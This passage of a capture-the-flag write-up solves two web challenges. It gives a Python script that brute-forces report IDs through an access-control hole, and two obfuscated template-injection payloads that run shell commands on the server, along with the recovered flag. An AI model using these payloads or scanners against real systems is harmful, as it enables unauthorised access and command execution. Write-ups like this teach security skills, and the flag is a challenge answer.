    "http://TARGET:5001/report?id=$id" \
    | grep -A1 '"report-content"' | tail -1 | xargs)
  echo "$content" | grep -qv "Fake report" && \
    [ -n "$content" ] && echo "ID $id: $content"
done
```

Python:
```python
#!/usr/bin/env python3
"""IDOR brute-force scanner for the Report challenge.
Skips 'Fake report' entries and prints only interesting content."""

import requests
import sys
import re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://23.179.17.92:5001"
MAX_ID = int(sys.argv[2]) if len(sys.argv) > 2 else 500

# Step 1: Register and login to get a session
s = requests.Session()
s.post(f"{TARGET}/register", data={"username": "scanner_user", "password": "P@ssw0rd!"})
s.post(f"{TARGET}/login", data={"username": "scanner_user", "password": "P@ssw0rd!"})

print(f"[*] Scanning report IDs 1 to {MAX_ID}...")
print(f"[*] Skipping 'Fake report' entries\n")

for report_id in range(1, MAX_ID + 1):
    r = s.get(f"{TARGET}/report", params={"id": report_id})

    # Extract content between report-content div
    match = re.search(r'class="report-content">\s*(.*?)\s*</div>', r.text, re.DOTALL)
    if not match:
        continue

    content = match.group(1).strip()

    # Skip fake/decoy reports
    if content.startswith("Fake report"):
        continue

    print(f"[+] Report ID {report_id}: {content}")

    # Highlight if flag found
    flag = re.search(r'CIT\{[^}]+\}', content)
    if flag:
        print(f"\n[!] FLAG FOUND: {flag.group()}")
        break

print("\n[*] Scan complete.")

```

We find the flag at report `347`:
```bash
┌──(root㉿kali)-[/home/kali/CTF@CIT]
└─# ./idor_report_bruteforce.py 
[*] Scanning report IDs 1 to 500...
[*] Skipping 'Fake report' entries

[+] Report ID 347: CIT{Acc355_C0ntr0l_M@tt3rs!}

[!] FLAG FOUND: CIT{Acc355_C0ntr0l_M@tt3rs!}

[*] Scan complete.
```
## Temporary Destruction

I hear something...

Visiting the main page we can attempt to insert things (e.g. XSS injection), this does not do anything though:

<img width="869" height="705" alt="image" src="https://github.com/user-attachments/assets/5a82abf9-b831-4288-ba07-7b7a72a0e1fb" />

XSS is not working. We can try Server-Side Template Injection (SSTI).

<img width="866" height="527" alt="image" src="https://github.com/user-attachments/assets/bbdfda9e-f480-4f55-a2df-ffcdc85efd9f" />

This input field is vulnerable to SSTI - where we can reach 49 observed by that input above.

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

Using this payload works:
```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

<img width="867" height="548" alt="image" src="https://github.com/user-attachments/assets/3e0dbd53-c6e4-411e-93e5-e5140bb869dc" />

We can see we are the CTF user. We can look at running more commands to figure out next steps.

If we run commands like `ls` we can see `not-the-flag.txt` which really isn't the flag.

Trying another payload due to challenges running commands like this:

```python
{{(""|attr("__cla"+"ss__")|attr("__mr"+"o__"))[1]
|attr("__subc"+"lasses__")()|attr("__geti"+"tem__")(494)
("ls -la /tmp",shell=True,stdout=-1)
|attr("communicate")()|attr("__geti"+"tem__")(0)}}
```

<img width="870" height="601" alt="image" src="https://github.com/user-attachments/assets/57cd7b4c-7f14-47c2-8324-374c841e5825" />

We can see the flag is here at `/tmp`.

<img width="864" height="534" alt="image" src="https://github.com/user-attachments/assets/fe450911-9cac-4d5d-aaf6-a9156cabb831" />

---
